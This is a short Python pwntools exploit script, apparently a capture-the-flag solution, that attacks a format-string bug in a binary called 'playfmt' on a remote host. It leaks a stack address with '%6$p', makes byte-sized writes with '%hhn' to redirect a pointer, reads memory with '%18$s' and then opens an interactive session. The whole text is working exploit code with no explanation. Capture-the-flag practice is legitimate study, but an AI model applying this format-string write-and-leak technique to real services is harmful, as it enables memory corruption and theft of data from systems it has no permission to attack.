from pwn import *
context(os = 'linux',arch = 'i386', log_level = 'debug')
debug = 0
if debug == 1:
	p = process('./playfmt')
else:
	p = remote('120.78.192.35', 9999)

p.recvuntil('r\n=====================\n')
#gdb.attach(p)
p.sendline('%6$p')
stack  = int(p.recvline(), 16)
print hex(stack)
assert((stack & 0xff) <= 0xef)
target = (stack  & 0xff) + 0x10
p.sendline('%' + str(target) + 'c%6$hhn\x00')
sleep(1)
p.sendline('%' + str(16) + 'c%14$hhn\x00')
sleep(1)
#gdb.attach(p)
p.sendline('%18$s\x00')

p.interactive()
